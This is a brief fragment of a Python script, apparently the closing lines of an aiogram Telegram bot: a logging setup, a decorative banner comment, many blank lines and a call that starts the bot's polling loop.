logging.basicConfig(level=logging.INFO)
################### F I N A L B A N N E R ####################











































if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
